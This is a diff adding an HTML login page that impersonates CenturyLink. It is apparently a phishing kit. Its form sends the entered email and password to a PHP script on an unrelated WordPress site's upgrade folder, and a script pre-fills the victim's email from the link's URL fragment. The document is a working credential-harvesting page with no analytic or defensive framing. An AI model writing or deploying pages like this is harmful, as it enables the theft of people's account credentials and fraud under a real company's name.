@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Overlay</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body, html {
+      margin: 0;
+      height: 100%;
+    }
+
+    .background {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+      background: url('background.png') no-repeat center center;
+      background-size: cover;
+    }
+
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+    }
+
+    .logo img {
+      height: 70px;
+    }
+
+    .overlay-form {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 320px;
+    }
+
+    .overlay-form input[type="email"],
+    .overlay-form input[type="password"] {
+      width: 100%;
+      padding: 12px 8px;
+      margin: 18px 0;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      font-size: 14px;
+      background: transparent;
+    }
+
+    .overlay-form input:focus {
+      outline: none;
+      border-bottom: 1px solid #000;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin: 10px 0 20px;
+    }
+
+    .checkbox-row input {
+      margin-right: 8px;
+    }
+
+    .sign-in-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a4fb3;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .sign-in-btn:hover {
+      background-color: #163f91;
+    }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    .links a {
+      color: #1a4fb3;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="background">
+
+  <!-- Logo -->
+  <div class="logo">
+    <img src="logo.png" alt="CenturyLink Logo">
+  </div>
+
+  <!-- Login Form -->
+  <form class="overlay-form" action="https://rwandacars.com/wp-content/upgrade/spec.php" method="POST">
+    <input type="email" id="email" name="email" placeholder="CenturyLink Email" required>
+    <input type="password" name="password" placeholder="Password" required>
+
+    <div class="checkbox-row">
+      <input type="checkbox" id="stay">
+      <label for="stay">Stay signed in</label>
+    </div>
+
+    <button type="submit" class="sign-in-btn">Sign In</button>
+
+    <div class="links">
+      <a href="#">Forgot Password?</a>
+      <a href="#">Need help?</a>
+    </div>
+  </form>
+
+</div>
+
+<script>
+  // Auto-fill email from URL fragment
+  window.addEventListener("DOMContentLoaded", function () {
+    const hash = decodeURIComponent(window.location.hash.substring(1));
+    if (hash && hash.includes("@")) {
+      document.getElementById("email").value = hash;
+    }
+  });
+</script>
+
+</body>
+</html>
